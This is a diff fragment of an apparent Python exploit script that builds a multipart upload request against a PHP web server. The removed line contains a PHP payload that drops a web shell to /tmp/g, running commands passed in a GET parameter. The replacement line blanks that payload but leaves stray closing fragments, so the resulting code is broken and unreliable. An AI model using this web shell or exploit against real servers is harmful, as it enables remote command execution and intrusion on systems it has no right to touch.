@@ -11,7 +11,7 @@ import socket
 def setup(host, port):
     TAG="Security Test"
     PAYLOAD="""%s\r
-<?php $c=fopen('/tmp/g','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>\r""" % TAG
+<?php                                                              ?>');?>\r""" % TAG
     REQ1_DATA="""-----------------------------7dbff1ded0714\r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
 Content-Type: text/plain\r
